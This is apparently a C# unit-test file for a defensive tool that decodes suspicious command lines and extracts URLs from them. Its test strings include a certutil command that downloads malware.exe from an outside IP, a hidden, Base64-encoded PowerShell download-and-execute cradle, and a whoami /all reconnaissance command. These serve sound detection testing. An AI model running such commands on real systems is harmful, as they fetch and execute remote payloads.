using System;
using System.Collections.Generic;
using System.Runtime.ExceptionServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Phalanx.Cockpit.Tools;
using Xunit;

namespace Phalanx.Agent.Tests;

[Trait("Category", "Unit")]
public class DecodePayloadZeroExceptionTests
{
    private readonly DecodePayloadTool _tool = new();

    [Fact]
    public async Task ExecuteAsync_CertUtilScenario_ThrowsZeroFormatException()
    {
        // 시나리오 #3: certutil 명령줄 (urlcache, malware, certutil 등 8자 이상 단어 다수 포함)
        string commandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/malware.exe C:\\Windows\\Temp\\malware.exe";

        int formatExceptionCount = 0;
        EventHandler<FirstChanceExceptionEventArgs> handler = (s, e) =>
        {
            if (e.Exception is FormatException)
            {
                Interlocked.Increment(ref formatExceptionCount);
            }
        };

        AppDomain.CurrentDomain.FirstChanceException += handler;
        try
        {
            var result = await _tool.ExecuteAsync(new() { ["encodedCommand"] = commandLine });

            Assert.True(result.Success);
            Assert.NotNull(result.Data);
            Assert.True(result.Data.ContainsKey("ExtractedUrls"));
            var urls = result.Data["ExtractedUrls"] as List<string>;
            Assert.NotNull(urls);
            Assert.Contains("http://185.220.101.5/malware.exe", urls);
        }
        finally
        {
            AppDomain.CurrentDomain.FirstChanceException -= handler;
        }

        // First-Chance Exception 0건 엄격 단언!
        Assert.Equal(0, formatExceptionCount);
    }

    [Fact]
    public async Task ExecuteAsync_VariousNonBase64Words_ThrowsZeroFormatException()
    {
        // 8자 이상 일반 영단어 및 식별자들이 대량 유입될 때 예외 0건 검증
        string input = "powershell MemoryStream FromBase64String DownloadString InvokeExpression HttpWebRequest WebClient certutil urlcache malware";

        int formatExceptionCount = 0;
        EventHandler<FirstChanceExceptionEventArgs> handler = (s, e) =>
        {
            if (e.Exception is FormatException)
            {
                Interlocked.Increment(ref formatExceptionCount);
            }
        };

        AppDomain.CurrentDomain.FirstChanceException += handler;
        try
        {
            var result = await _tool.ExecuteAsync(new() { ["encodedCommand"] = input });
            Assert.True(result.Success);
        }
        finally
        {
            AppDomain.CurrentDomain.FirstChanceException -= handler;
        }

        Assert.Equal(0, formatExceptionCount);
    }

    [Fact]
    public async Task ExecuteAsync_RealBase64Payload_DecodesCorrectlyWithoutException()
    {
        // 실제 정상 Base64 페이로드 해독 회귀 검증
        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64Unicode = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -w hidden -enc {b64Unicode}";

        int formatExceptionCount = 0;
        EventHandler<FirstChanceExceptionEventArgs> handler = (s, e) =>
        {
            if (e.Exception is FormatException)
            {
                Interlocked.Increment(ref formatExceptionCount);
            }
        };

        AppDomain.CurrentDomain.FirstChanceException += handler;
        try
        {
            var result = await _tool.ExecuteAsync(new() { ["encodedCommand"] = fullCmd });

            Assert.True(result.Success);
            Assert.NotNull(result.Data);
            Assert.True(result.Data.ContainsKey("DecodedPayload"));
            string decoded = result.Data["DecodedPayload"]?.ToString() ?? string.Empty;
            Assert.Contains("DownloadString", decoded);
            Assert.Contains("185.220.101.5", decoded);
        }
        finally
        {
            AppDomain.CurrentDomain.FirstChanceException -= handler;
        }

        Assert.Equal(0, formatExceptionCount);
    }

    [Fact]
    public async Task ExecuteAsync_UrlSafeAndUnpaddedBase64_DecodesSuccessfully()
    {
        // URL-Safe Base64 및 패딩 생략 페이로드 검증
        string raw = "whoami /all";
        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(raw)).TrimEnd('='); // 패딩 제거
        string cmd = $"cmd.exe /c echo {b64}";

        int formatExceptionCount = 0;
        EventHandler<FirstChanceExceptionEventArgs> handler = (s, e) =>
        {
            if (e.Exception is FormatException)
            {
                Interlocked.Increment(ref formatExceptionCount);
            }
        };

        AppDomain.CurrentDomain.FirstChanceException += handler;
        try
        {
            var result = await _tool.ExecuteAsync(new() { ["encodedCommand"] = cmd });
            Assert.True(result.Success);
            string decoded = result.Data?["DecodedPayload"]?.ToString() ?? string.Empty;
            Assert.Contains("whoami", decoded);
        }
        finally
        {
            AppDomain.CurrentDomain.FirstChanceException -= handler;
        }

        Assert.Equal(0, formatExceptionCount);
    }
}
